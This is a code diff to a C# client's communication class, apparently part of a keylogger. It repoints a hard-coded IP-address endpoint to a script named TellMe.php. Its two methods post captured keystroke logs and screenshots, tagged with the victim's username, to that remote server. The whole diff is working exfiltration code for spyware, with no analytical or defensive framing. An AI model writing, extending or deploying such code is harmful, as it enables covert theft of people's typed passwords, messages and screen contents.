@@ -16,11 +16,8 @@ namespace Client.Communication
         /// <summary>
         /// The server's endpoint.
         /// </summary>
-        private static string API = "http://194.233.71.142/ll";
-
-
-        /// Endpoints:
-        // /upload.php - handles uploading of files
+        
+        private static string API = "http://194.233.71.142/ll/TellMe.php";
 
         public async static Task<bool> AsyncSendKeylogs(string logged, string username) {
             bool result = false;
@@ -31,7 +28,7 @@ namespace Client.Communication
                     HttpClient httpClient = new HttpClient();
                     MultipartFormDataContent form = new MultipartFormDataContent();
                     form.Add(new StringContent(logged), "logs");
-                    HttpResponseMessage response = httpClient.PostAsync($"{API}/upload.php?username=\"{HttpUtility.UrlEncode(username)}\"&type=logs", form).Result;
+                    HttpResponseMessage response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=logs", form).Result;
                     httpClient.Dispose();
                     result = true;
                 }
@@ -52,7 +49,7 @@ namespace Client.Communication
                     HttpClient httpClient = new HttpClient();
                     MultipartFormDataContent form = new MultipartFormDataContent();
                     form.Add(new ByteArrayContent(image_buffer, 0, image_buffer.Length), "file", "file");
-                    HttpResponseMessage response = httpClient.PostAsync($"{API}/upload.php?username=\"{HttpUtility.UrlEncode(username)}\"&type=screenshot", form).Result;
+                    HttpResponseMessage response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=screenshot", form).Result;
                     httpClient.Dispose();
                     result = true;
                 }
